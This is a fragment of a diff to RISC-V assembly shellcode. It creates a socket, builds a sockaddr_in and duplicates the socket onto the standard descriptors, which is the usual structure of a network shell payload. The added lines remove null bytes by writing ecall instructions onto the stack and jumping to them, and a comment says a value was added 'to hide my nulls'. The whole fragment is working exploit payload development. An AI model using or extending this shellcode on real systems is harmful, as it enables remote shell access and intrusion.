@@ -84,7 +84,19 @@ _start:
 	addi a1,a1,-0xe0
 	addi a7,a7,0xee
 	addi a7,a7,-40
-	ecall #socket fd in a0
+	#ecall #socket fd in a0
+	###
+	addi sp,sp,-4
+	xor a3,a7,a7
+	addi a3,a6,0x0073
+	sd a3,0(sp) #<
+	xor a3,a7,a7
+	li a3,0x8067 #<
+	sd a3,4(sp)
+	xor a3,a7,a7
+	addi a3,sp,-0x11
+	jalr ra,0x11(a3) #ecall is a fixed value, jalr onto the stack fixes it
+	###
 	#create sockaddr_in
 	addi sp,sp,-16
 	xor a7,a7,a7
@@ -113,6 +125,7 @@ _start:
 	xor t0,a7,a7
 	addi t0,a0,1337 #added a value to hide my nulls, this will need subbed later
 	ecall
+	##WORK
 	#dup2(a0,{1,2,3})
 	xor a0,a7,a7
 	addi a0,t0,-1337
